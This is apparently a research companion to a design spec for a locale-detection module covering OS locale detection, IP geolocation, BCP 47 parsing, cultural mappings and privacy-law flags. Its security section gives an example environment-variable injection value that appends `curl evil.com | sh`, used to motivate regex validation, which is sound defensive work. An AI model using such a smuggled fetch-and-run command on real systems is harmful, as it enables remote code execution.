# SPEC-MINK-LOCALE-001 — Research Notes

> Companion to `./spec.md`. Captures prior-art survey, library comparison, Hermes gateway pattern analysis, and edge-case catalog used to harden requirements.

---

## 1. Hermes Gateway 다국어 패턴 분석

Hermes Agent는 15+ LLM 프로바이더를 **프로바이더 다양성** 관점에서 설계했다(`hermes-llm.md` §2). GOOSE는 동일한 다양성 엔지니어링을 **사용자 국가/언어/문화권** 차원에서 재현한다.

### 1.1 Hermes의 다국어 자산 (`agent/locale/` 패턴)

Hermes는 system prompt에 locale context를 injection하는 **정적 문자열 블록**을 채택했다. 장점:

- LLM이 자체 reasoning으로 honorific, 통화 단위, 측정 체계를 조정
- 별도 persona engine 없이도 90% 케이스에서 자연스러운 답변
- 토큰 오버헤드 ~300 tokens/request(caching 적용 시 추가 비용 ≈ 0)

### 1.2 GOOSE 계승 원칙

| Hermes 방식 | GOOSE 반영 |
|-----------|----------|
| system prompt에 단일 locale 블록 주입 | `BuildSystemPromptAddendum` 함수로 재현 |
| 4개 주요 언어(en/ko/ja/zh) 집중 | I18N-001에서 Tier 1로 확장 |
| ICU 없이 Go 네이티브로 플러럴·통화 처리 | `golang.org/x/text/language` 기반 |
| prompt caching에 친화적 구조(system 블록 안정화) | PROMPT-CACHE-001의 caching boundary 1과 호환 |

### 1.3 GOOSE 개선점

- **다국적 사용자**: Hermes는 단일 언어 가정. GOOSE는 primary+secondary로 code-switching 지원(한국 거주 미국인).
- **법률 flags**: Hermes에는 GDPR/PIPA 개념이 없음. GOOSE는 `legal_flags`를 부가.
- **충돌 보존**: Hermes는 OS vs IP 불일치를 알리지 않음. GOOSE는 `LocaleConflict`로 보존 → ONBOARDING-001 UX 원천.

---

## 2. OS Locale Detection 비교

### 2.1 Linux

| 방법 | 출처 | 장단점 |
|------|-----|-------|
| `os.Getenv("LANG")` | POSIX | 대부분 시스템에 설정, but `C` / `POSIX` 값일 수 있음 |
| `os.Getenv("LC_ALL")` | POSIX | `LANG`보다 우선, but 일반 사용자 미설정 |
| `os.Getenv("LC_MESSAGES")` | POSIX | 메시지 언어 전용, country 정보 부족 |
| `/etc/locale.conf` 읽기 | systemd | CI 환경(docker)에서 미존재 가능 |
| `/etc/default/locale` | Debian/Ubuntu | 배포판 의존 |

**결정**: `LC_ALL` > `LC_MESSAGES` > `LANG` 순 fallback. 모두 없으면 `/etc/locale.conf` 시도.

### 2.2 macOS

| 방법 | 출처 | 장단점 |
|------|-----|-------|
| `defaults read -g AppleLocale` | Apple API | 가장 신뢰할 수 있음, but `exec.Command` 비용 |
| `defaults read -g AppleLanguages` | Apple API | 배열 반환, 첫 항목 사용 |
| `CFLocaleCopyCurrent()` (CGO) | CoreFoundation | CGO 복잡도 증가, 회피 권장 |

**결정**: `exec.Command("defaults", "read", "-g", "AppleLocale")` 1회 호출, 결과 파싱. CGO 배제.

### 2.3 Windows

| 방법 | 출처 | 장단점 |
|------|-----|-------|
| `GetUserDefaultLocaleName` | Win32 API | 표준 방법, `golang.org/x/sys/windows`에서 직접 호출 가능 |
| `GetSystemDefaultLCID` | Win32 API | 사용자 설정이 아닌 시스템 기본값 |
| `GetUserPreferredUILanguages` | Win32 API | 다중 언어 반환, secondary_language 추출에 유용 |
| PowerShell `Get-Culture` | Shell | 느림, 회피 |

**결정**: `GetUserDefaultLocaleName`을 주로 사용, `GetUserPreferredUILanguages`로 secondary_language 보조.

---

## 3. IP Geolocation 라이브러리 비교

### 3.1 Offline DB

| 라이브러리 | 라이센스 | 크기 | 정확도 | 결정 |
|-----------|--------|-----|-------|------|
| MaxMind GeoLite2-Country | CC BY-SA 4.0 | ~4MB | country 99%+ | **채택** |
| db-ip.com Lite | CC BY 4.0 | ~3MB | country 95% | 예비 |
| IPinfo Lite | 상용 free tier | - | - | 제외 (가입 필요) |

### 3.2 HTTP Fallback

| 서비스 | free tier | HTTPS | 결정 |
|-------|-----------|-------|------|
| ipapi.co | 1000 req/day | ✅ | **채택** (primary fallback) |
| ipinfo.io | 50k req/month | ✅ | 예비 |
| ip-api.com | 45 req/min (HTTP only) | ❌ | 제외 (HTTPS 없음) |

### 3.3 중국 시장 특이사항

- ipapi.co는 GFW에 간헐적으로 차단
- REQ-LC-015: `country="CN"`이면 HTTP fallback 스킵
- 중국 사용자는 OS 감지 + MaxMind DB로만 결정

---

## 4. BCP 47 Language Tag Parsing

### 4.1 `golang.org/x/text/language` vs 자체 구현

| 기능 | `x/text/language` | 자체 구현 |
|------|-------------------|---------|
| BCP 47 전체 grammar | ✅ | 복잡 |
| 대소문자 정규화 (`ko-kr` → `ko-KR`) | ✅ | 가능 |
| 통화/캘린더 추론 (`en-US` → USD) | `x/text/currency`로 보조 | 불가 |
| Go 표준 호환 | ✅ | N/A |

**결정**: `golang.org/x/text/language.Parse` 채택. `language.MustParse("ko-KR").Region()` = `KR`.

### 4.2 엣지 케이스

- `zh-Hans-CN` (Simplified Chinese in China) → `country=CN, primary_language=zh-Hans-CN`
- `zh-Hant-TW` (Traditional Chinese in Taiwan) → `country=TW, primary_language=zh-Hant-TW`
- `es-419` (Latin American Spanish) → region resolves to `419` (UN code), 처리 필요
- `en-GB` vs `en-US` → measurement_system 다름(imperial vs mixed)

### 4.3 Measurement System Resolution

| Country | System |
|---------|--------|
| US, LR, MM | imperial |
| GB | mixed(road: mph+mile, weight: stone/pound, 그 외 metric) |
| 기타 대부분 | metric |

GOOSE는 **mixed**를 별도 enum으로 두지 않고 `imperial`로 표기(GB는 metric+mph 혼용이나 UI 표시는 mile). 정밀 구분 필요 시 I18N-001이 country별 unit preference 테이블로 보조.

---

## 5. Calendar System 결정 트리

| Country | Primary | Secondary(UI 옵션) |
|---------|--------|-------------------|
| SA, YE, AF, IR | hijri | gregorian |
| IL | gregorian | hebrew |
| TH | thai_buddhist | gregorian |
| CN, TW, HK, SG, MY | gregorian | chinese_lunar |
| IN | gregorian | hindu (옵션) |
| 기타 | gregorian | — |

`CalendarSystem` 필드는 primary 하나만 저장. REGION-SKILLS-001이 secondary(음력/히즈라) 기능을 Skill로 제공.

---

## 6. Cultural Mapping 결정 근거

### 6.1 Honorific System 분류

| System | 사용 지역 | 기술적 필요 |
|--------|---------|----------|
| korean_jondaetmal | KR | -습니다/해요/반말 3단계 |
| japanese_keigo | JP | 丁寧語/尊敬語/謙譲語 구분 |
| chinese_jing | CN, TW, HK | 您 vs 你 |
| vietnamese_anh_em | VN | 나이 서열 기반 대명사 |
| arabic_formal_familiar | SA, AE, EG, ... | حضرتك vs أنت |
| hindi_aap_tum | IN, PK | आप/तुम/तू 3단계 |
| german_sie_du | DE, AT, CH | Sie vs du |
| french_tu_vous | FR, BE, CH, CA | tu vs vous |
| italian_lei_tu | IT | Lei vs tu |
| spanish_usted_tu | ES, MX, AR, ... | usted vs tú |
| russian_vy | RU, BY, UA | Вы vs ты |
| thai_khun | TH | คุณ honorific |
| turkish_siz | TR | siz vs sen |
| portuguese_senhor | BR, PT | Sr./Sra. 접미사 |
| polish_pan_pani | PL | Pan/Pani |
| none | US, GB, AU, ... | first-name basis |

16종. `cultural.go` 상수 문자열로 정의. 각 값은 LLM에게 "이 honorific system을 사용하라"는 지시이며, 실제 문법은 LLM이 학습된 대로 생성.

### 6.2 Weekend Days

| 국가 | 주말 | 비고 |
|------|-----|------|
| SA, QA, KW, OM, YE, AE(부분) | Fri, Sat | 이슬람 전통 |
| IR | Thu, Fri | 이란 특이 |
| IL | Fri(오후), Sat | 샤바트 |
| IN, NP | Sun | 단일 주말 |
| 기타 대부분 | Sat, Sun | 표준 |

### 6.3 First Day of Week

- ISO 8601 / 대부분 유럽: Monday
- 미주, 동아시아 일부: Sunday
- 중동: Saturday

Unicode CLDR `supplemental/weekData.xml` 참조. 본 SPEC은 약 20개 대표국만 매핑하고 나머지는 기본값(Monday).

---

## 7. Legal Flag 매핑 근거

| 국가/지역 | 법률 | 본 SPEC 처리 |
|---------|-----|-------------|
| EU 27개국 + EEA | GDPR | 엄격 모드: 동의 명시, 최소 수집 |
| UK | UK GDPR(Brexit 후) | GDPR와 거의 동일, `ukgdpr` 별도 flag |
| US (CA, VA, CO, ...) | CCPA, CDPA 등 주법 | `ccpa` flag |
| KR | PIPA (개인정보보호법) | 주민등록번호 수집 금지 |
| JP | APPI (個人情報保護法) | 본 SPEC은 flag만 |
| CN | PIPL (个人信息保护法) | 데이터 현지화 권고 |
| BR | LGPD | GDPR 유사 |
| RU | Federal Law 152-FZ | 데이터 현지화 의무 |
| IN | DPDP Act 2023 | 신규 |
| SG, MY, TH, VN | PDPA 계열 | 국가별 flag |

flag는 **힌트**(hint)이며 실제 준수 로직은 각 SPEC(JOURNAL-001 PIPA, MEMORY-001 GDPR 등)이 결정. LocaleContext는 "이 사용자에게 어떤 법률 프레임워크가 적용될 가능성이 높다"만 알려준다.

---

## 8. Security Edge Cases

### 8.1 환경변수 Injection

공격자가 `LANG="en_US.UTF-8; curl evil.com | sh"`를 주입 시도. `exec.Command`로 `defaults`를 호출할 때 shell 해석이 안 되지만, 로그나 다른 경로에서 유출 위험.

**방어**:
- 정규식 `^[a-z]{2,3}(_[A-Z]{2,3})?(\.[A-Za-z0-9-]+)?(@[A-Za-z0-9=,_-]+)?$` 검증
- 실패 시 default(en-US) + security event 로그
- AC-LC-010 테스트로 회귀 방지

### 8.2 IP Geolocation 프라이버시

- IP 주소는 개인정보(GDPR recital 30). 본 SPEC은 country만 저장하고 IP 자체는 영속 금지.
- ipapi.co HTTP 요청에 User-Agent만 전송, 세션 ID 미포함.
- 사용자가 `geolocation_enabled=false`로 비활성화하면 IP fallback 전체 스킵.

### 8.3 MaxMind DB 변조

- DB 파일은 체크섬 검증(SHA-256) 후 로드. 불일치 시 폴백.
- `geoip_db_path`를 심볼릭 링크로 공격자가 교체 시도 → 경로 정규화(`filepath.EvalSymlinks`) 후 `~/.goose/` 서브트리 여부 확인.

---

## 9. Accept-Language vs 본 SPEC의 관계

HTTP `Accept-Language` 헤더 파싱은 **I18N-001** 책임. 본 SPEC은:

- Desktop/Mobile 앱의 **초기 설치 시점**에 locale을 결정
- 서버 요청 시점의 content negotiation은 관여하지 않음
- 단, `LocaleContext.primary_language`는 I18N-001의 default `Accept-Language` 값으로 사용 가능

---

## 10. 테스트 매트릭스

| Test ID | Target | Platform | Type |
|---------|--------|---------|------|
| AC-LC-001 | Linux LANG parsing | Linux | unit |
| AC-LC-002 | macOS defaults read | macOS | integration |
| AC-LC-002b | Windows GetUserDefaultLocaleName | Windows | integration |
| AC-LC-003 | MaxMind VN lookup | any | unit (mock reader) |
| AC-LC-004 | User override priority | any | unit |
| AC-LC-005 | Bilingual prompt addendum | any | unit |
| AC-LC-006~007 | Cultural mapping KR/SA | any | table test (20+ countries) |
| AC-LC-008 | OS vs IP conflict | any | unit |
| AC-LC-009 | CN skip ipapi | any | unit |
| AC-LC-010 | ENV injection reject | any | unit |
| AC-LC-011 | Prompt ≤ 400 tokens | any | property test |
| AC-LC-012 | Stale DB warning | any | unit |

CI 매트릭스: `ubuntu-latest`, `macos-latest`, `windows-latest`. 각 OS에서 native detector 테스트 실행.

---

## 11. 재사용 vs 재작성 예상 LoC

| 모듈 | 재사용 | 재작성 | 총 Go LoC 추정 |
|------|-------|-------|--------------|
| OS detector (3 OS) | `x/sys/windows` | Linux/macOS 파서 | ~250 |
| Cultural mapping table | — | 정적 맵 (20+ countries) | ~180 |
| LocaleContext serialization | yaml.v3 | tag 정의 | ~50 |
| BCP 47 parsing | `x/text/language` | wrapper | ~40 |
| IP geolocation offline | `maxminddb-golang` | caller + caching | ~90 |
| IP geolocation HTTP | `net/http` | ipapi 래퍼 | ~70 |
| Prompt addendum builder | — | template + 포매터 | ~80 |
| Tests | — | table + mock | ~600 |
| **합계** | — | — | **~1360 LoC** |

SPEC 크기 `S` (500~1500 LoC) 범위 준수.

---

## 12. 오픈 이슈 (본 SPEC 내에서 미결)

1. **Secondary language 자동 감지**: OS는 primary만 제공. secondary는 ONBOARDING-001에서 사용자 입력 의존. 추후 대화 이력 분석으로 추론 가능 여부(Phase 8 IDENTITY-001과 연계).
2. **Windows PowerShell 의존**: `GetUserPreferredUILanguages` 호출 대안으로 PowerShell이 필요할 수 있음. 순수 x/sys/windows로 가능한지 재검토.
3. **MaxMind DB 배포**: 번들 포함(4MB) vs on-demand 다운로드(CLI-001 `goose locale update-db`). v0.1은 번들, v0.5부터 on-demand 전환 검토.
4. **`x/text/currency` 의존**: country → currency 매핑에 사용 시 추가 의존성 증가. 수동 매핑으로 대체 가능(ISO 3166 ↔ ISO 4217 약 240개 매핑).
5. **Cultural mapping PR 프로세스**: 외부 기여자가 새 country 추가 시 문화적 정확성 검증 방법론 미확정.

---

## 13. 참고 문헌

- Unicode CLDR: https://cldr.unicode.org/ (weekData, measurementSystem, calendarPreference)
- BCP 47: https://datatracker.ietf.org/doc/html/rfc5646
- GDPR Article 3 (Territorial scope)
- PIPA (Korea Personal Information Protection Act)
- ISO 3166-1 / ISO 4217 / ISO 8601
- `golang.org/x/text/language` package documentation
- MaxMind GeoLite2 licensing terms

---

**End of research.md for SPEC-MINK-LOCALE-001**
